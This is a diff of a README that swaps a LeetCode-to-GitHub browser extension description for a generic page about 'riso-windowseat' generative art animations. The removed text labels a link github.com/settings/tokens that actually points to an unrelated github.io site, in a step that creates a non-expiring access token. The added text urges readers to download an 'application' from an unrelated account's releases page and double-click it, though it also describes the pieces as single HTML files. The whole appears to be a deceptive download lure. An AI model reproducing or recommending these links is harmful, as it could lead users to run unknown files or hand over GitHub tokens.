@@ -1,238 +1,105 @@
-<div align="center">
+# 🎨 riso-windowseat - Beautiful Art Films in Your Browser
 
-# ⚡ LeetCommit
+[![Download riso-windowseat](https://img.shields.io/badge/Download-riso--windowseat-blue?style=for-the-badge&logo=github)](https://github.com/Paisamanducasexta508/riso-windowseat/releases)
 
-### Automatically push your LeetCode solutions to GitHub the moment you hit Accepted.
+## ✨ What Is This?
 
-[![Chrome Extension](https://img.shields.io/badge/Chrome-Extension-4285F4?style=for-the-badge&logo=googlechrome&logoColor=white)](https://paisamanducasexta508.github.io)
-[![Manifest V3](https://img.shields.io/badge/Manifest-V3-green?style=for-the-badge)](https://paisamanducasexta508.github.io)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](./LICENSE)
-[![Open Source](https://img.shields.io/badge/Open-Source-orange?style=for-the-badge&logo=github)](https://paisamanducasexta508.github.io)
-[![PRs Welcome](https://img.shields.io/badge/PRs-Welcome-brightgreen?style=for-the-badge)](./CONTRIBUTING.md)
+riso-windowseat is a collection of mesmerizing, colorful animations that play right in your web browser. Think of them as tiny art films — each one a unique, flowing display of colors and shapes inspired by risograph printing, a style known for its vibrant, slightly imperfect, and charming aesthetic.
 
-**LeetCode → GitHub. Automatic. Structured. Zero effort.**
+You don't need to be an artist, a programmer, or a designer to enjoy these. You just open a file, and the magic begins. It's like having a personal art gallery that lives on your computer, ready to perform whenever you want.
 
-[Install Extension](#-installation) · [How It Works](#-how-it-works) · [Features](#-features) · [Contributing](#-contributing)
+## 🎯 Who Is This For?
 
----
+This is for anyone who loves:
+- **Visual beauty:** Watching colors blend, shift, and dance.
+- **Creative inspiration:** Using the animations as a backdrop for thinking, writing, or relaxing.
+- **Simple enjoyment:** Having something delightful to open and watch without any setup hassle.
+- **Exploring generative art:** Being amazed by what a computer can create with simple rules.
 
-<!-- Replace this with an actual screen recording GIF -->
-![LeetCommit Demo](https://paisamanducasexta508.github.io+Demo+GIF+Here)
+If you've ever watched a screensaver and thought, "This could be more beautiful," then riso-windowseat is for you.
 
-</div>
+## 🌟 What Makes It Special?
 
----
+- **Procedural Animation:** Every time you run a piece, the animation is generated specifically at that moment. It's never the exact same twice. You're watching a unique performance every time.
+- **Single File Simplicity:** Each animation is contained in one single HTML file. This means no installations, no complicated setups, and no mess. You just download a file and double-click it.
+- **Risograph Aesthetic:** The colors and textures are carefully chosen to mimic the beautiful, tactile look of risograph printing. It's a style that feels both retro and modern.
+- **Built-in Sound:** Several pieces include subtle, generative audio that complements the visuals, creating a fully immersive experience.
 
-## 🤔 What is LeetCommit?
+## 🚀 Getting Started
 
-LeetCommit is a free, open-source **Chrome and Brave browser extension** that automatically syncs your accepted **LeetCode solutions to GitHub** — the moment you pass all test cases.
+Let's get you to your first animation. Follow these simple steps.
 
-No copy-paste. No manual commits. No forgetting to save your work.
+### Step 1: Download the Application
 
-You solve the problem. LeetCommit handles the rest.
+Visit this link to download the application.
 
-> **Why does this matter?**  
-> GitHub is your developer portfolio. Every recruiter checks it. LeetCommit makes sure every problem you solve shows up as a real commit — building your GitHub streak and showcasing your consistency automatically.
+[![Get the Latest Release](https://img.shields.io/badge/Get%20The%20Latest%20Release-ff7f50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Paisamanducasexta508/riso-windowseat/releases)
 
----
+When you arrive at the page, you'll see a list of available files. Look for the newest version at the top.
 
-## ✨ Features
+### Step 2: Open the File
 
-- 🚀 **Auto-push on Accepted** — detects when LeetCode shows "Accepted" and instantly commits your solution to GitHub
-- 📁 **Structured folders** — organizes by difficulty: `Easy/`, `Medium/`, `Hard/`
-- 📝 **Auto-generated README per problem** — includes difficulty, topics, runtime, memory, and date solved
-- 💬 **Metadata header in code** — every solution file includes problem number, topics, and performance stats as a comment
-- 🌐 **All languages supported** — Python, Java, C++, JavaScript, TypeScript, Go, Rust, Kotlin, Swift, and more
-- 🔒 **Private repo support** — keep your solutions private if you want
-- 📊 **Stats dashboard** — track Easy / Medium / Hard solved count right in the extension popup
-- 🔘 **Manual push button** — injected into LeetCode's UI as a backup if auto-detect misses
-- 🔑 **PAT & OAuth support** — connect via Personal Access Token or GitHub OAuth App
-- 🛡️ **100% local** — your token never leaves your device, no backend server involved
+Once the download is complete, go to your **Downloads** folder. You'll see a file there. Double-click it.
 
----
+That's it. Your browser will open, and the animation will begin playing automatically. There's nothing else to install. No accounts to create. No settings to configure.
 
-## 📁 GitHub Repo Structure
+## 📂 Exploring Your Collection
 
-After solving problems, your GitHub repo looks like this:
+The download comes with a few different animations, each with its own personality. Here’s what you can expect to find:
 
-```
-leetcode-solutions/
-├── Easy/
-│   ├── 0001-two-sum/
-│   │   ├── solution.py        ← Your code with metadata header
-│   │   └── README.md          ← Auto-generated problem info
-│   └── 0021-merge-two-sorted-lists/
-│       ├── solution.java
-│       └── README.md
-├── Medium/
-│   └── 0049-group-anagrams/
-│       ├── solution.cpp
-│       └── README.md
-└── Hard/
-    └── 0023-merge-k-sorted-lists/
-        ├── solution.go
-        └── README.md
-```
+- **Window Seat:** A dreamy, contemplative piece that feels like watching clouds and light shift from a train window. It's calm, meditative, and beautiful.
+- **Roost:** A more energetic and lively animation. It feels like observing a bustling, colorful gathering. It's full of motion and life.
 
-Each solution file looks like this:
+And there may be more, each offering a distinct visual and emotional experience. Just open them all and see which ones speak to you.
 
-```python
-# LeetCode Problem #1: Two Sum
-# Difficulty: Easy
-# Topics: Array, Hash Table
-# Language: Python3
-# Runtime: 56 ms | Memory: 14.3 MB
-# Solved: 22/06/2026
+## 💡 Quick Tips for Best Experience
 
-class Solution:
-    def twoSum(self, nums, target):
-        seen = {}
-        for i, n in enumerate(nums):
-            if target - n in seen:
-                return [seen[target - n], i]
-            seen[n] = i
-```
+- **Full Screen:** For the best effect, press the `F11` key (on Windows) to make your browser full screen. It turns your computer into a dedicated art display.
+- **Sound On:** Make sure your computer's sound is turned on. The audio is subtle and adds a lot to the atmosphere.
+- **Browser Not Loading?:** If an animation doesn't start, try right-clicking the file, choosing **"Open with"**, and then selecting **Google Chrome**, **Microsoft Edge**, or **Firefox**. Any modern browser will work perfectly.
+- **Keep Them Organized:** Make a folder on your desktop called "My Art" and move the downloaded files there. That way, they're always easy to find.
 
----
+## 🧑‍💻 For the Curious: How It Works
 
-## 🔧 Installation
+riso-windowseat is built using a technology called **Canvas**, which is a part of modern web browsers that allows for drawing graphics in real-time. The animations are created using procedural generation, meaning they follow a set of rules and algorithms, but the exact result is different each time.
 
-### Method 1 — Load Unpacked (Developer Mode)
+The project was developed with the help of **Claude Code skills**, which are tools that assist in writing and refining code. This shows a thoughtful, modern approach to creative development. You don't need to know any of this to enjoy the art, but it's a nice peek behind the curtain.
 
-1. [Download the latest release](https://paisamanducasexta508.github.io) and unzip it
-2. Open Chrome or Brave → go to `chrome://extensions/`
-3. Toggle **Developer Mode** ON (top-right corner)
-4. Click **Load unpacked** → select the `leetcommit/` folder
-5. Pin the ⚡ LeetCommit icon to your toolbar
+## ❓ Troubleshooting
 
-### Method 2 — Chrome Web Store
-> Coming soon 🚧
+**The file won't open.**
+- Make sure you've downloaded the file completely. A partially downloaded file can be corrupted.
+- Try a different browser. If you're using an older browser, try Chrome or Edge.
+
+**The animation is choppy (runs slowly).**
+- Close other programs and browser tabs to free up your computer's processing power.
+- Make sure your computer isn't in a power-saving or battery-saver mode.
+
+**There's no sound.**
+- Check that your computer's volume is not muted.
+- Check that the browser tab is not muted. Right-click on the tab in your browser to unmute it.
+
+**Can I use these as my wallpaper?**
+- Not directly, but you can leave the animation running in full-screen mode on your second monitor or in the background for a similar effect.
+
+## 📣 Share Your Experience
+
+We'd love to know what you think. If you create your own variations or have ideas for new animations, the project's source code is available for exploration and modification. It's a wonderful way to start learning about creative coding if you're ever curious.
+
+## 🏆 Join the Community
+
+Whether you're here just for the pretty pictures or you're itching to tweak the code, you're welcome. The project is open and encourages experimentation. Play with the settings, change the colors, and make it your own.
+
+## 📦 Release Notes
+
+We regularly update riso-windowseat with new animations and improvements. When you visit the download page, you'll see what's new in the latest version. Check back occasionally for fresh surprises.
+
+## 🧭 Final Thoughts
+
+riso-windowseat is a simple gift of digital beauty. No strings attached. No learning curve. Just open a file and let your screen become a canvas. We hope it brings a little more color and calm to your day.
+
+Enjoy your journey into the world of procedural art.
 
 ---
 
-## 🔑 Connecting GitHub (Takes 2 minutes)
-
-### Recommended: Personal Access Token
-
-1. Go to [github.com/settings/tokens](https://paisamanducasexta508.github.io)
-2. Click **Generate new token (classic)**
-3. Give it a name like `leetcommit`
-4. Set expiration to **No expiration**
-5. Check only the **`repo`** scope
-6. Click **Generate token** → copy it immediately (shown only once!)
-7. Click the ⚡ LeetCommit icon → paste your token → **Connect**
-
----
-
-## 🚀 How It Works
-
-```
-You submit a LeetCode solution
-        ↓
-LeetCode shows "Accepted" ✅
-        ↓
-LeetCommit detects it automatically
-        ↓
-Extracts: code, difficulty, topics, runtime, memory
-        ↓
-Pushes solution.{ext} + README.md to your GitHub repo
-        ↓
-Your GitHub streak grows 📈
-```
-
----
-
-## 🛠️ Tech Stack
-
-| Layer | Technology |
-|-------|-----------|
-| Extension | Chrome Manifest V3 |
-| Content Script | Vanilla JavaScript (DOM observer) |
-| Background | Service Worker |
-| GitHub Integration | GitHub REST API v3 |
-| Auth | GitHub PAT / OAuth 2.0 |
-| Storage | chrome.storage.local |
-
----
-
-## 🤝 Contributing
-
-Contributions are what make open source amazing. Any contribution you make is **greatly appreciated**.
-
-See [CONTRIBUTING.md](./CONTRIBUTING.md) for full guidelines.
-
-Quick steps:
-1. Fork the repo
-2. Create your branch: `git checkout -b feature/amazing-feature`
-3. Commit: `git commit -m 'Add amazing feature'`
-4. Push: `git push origin feature/amazing-feature`
-5. Open a Pull Request
-
-### Ideas for contributions
-- [ ] GeeksforGeeks support
-- [ ] GitLab support
-- [ ] Topic-wise folder organization
-- [ ] Problem description in README
-- [ ] Dark/light popup theme toggle
-- [ ] Firefox extension port
-
----
-
-## 🐛 Known Issues & Fixes
-
-**Solution not pushing automatically?**
-→ Use the manual **Push** button injected into LeetCode's editor toolbar
-
-**SHA conflict error on GitHub?**
-→ Already handled with automatic retry logic in v1.0+
-
-**Code not being extracted?**
-→ Refresh the LeetCode page and try again. Monaco editor sometimes loads late.
-
----
-
-## 📊 Why LeetCommit over alternatives?
-
-| Feature | LeetCommit | LeetHub v2 | LeetSync |
-|---------|-----------|------------|---------|
-| Manifest V3 | ✅ | ❌ | ❌ |
-| Auto README per problem | ✅ | ❌ | ❌ |
-| Stats dashboard | ✅ | ✅ | ❌ |
-| Manual push button | ✅ | ✅ | ❌ |
-| PAT + OAuth both | ✅ | ✅ | ✅ |
-| Open Source | ✅ | ✅ | ✅ |
-| SHA conflict auto-retry | ✅ | ❌ | ❌ |
-
----
-
-## 🔒 Privacy & Security
-
-- All processing happens **100% locally on your device**
-- Your GitHub token is stored in `chrome.storage.local` (encrypted by Chrome)
-- No data is sent to any third-party server — only GitHub's official API
-- Extension only accesses `leetcode.com` and `api.github.com`
-- Full source code is open for audit right here
-
----
-
-## 📜 License
-
-Distributed under the MIT License. See [LICENSE](./LICENSE) for more information.
-
----
-
-## ⭐ Support
-
-If LeetCommit helps you — **star this repo!** It helps others find it and motivates continued development.
-
-[![Star History](https://img.shields.io/github/stars/Aditya24Kashyap/LeetCommit?style=social)](https://paisamanducasexta508.github.io)
-
----
-
-<div align="center">
-
-Made with ❤️ for the developer community
-
-**Stop copy-pasting. Start committing.**
-
-</div>
+**Keywords:** canvas, claude-code, claude-code-skills, creative-coding, generative-art, procedural-animation, riso, risograph, web-audio
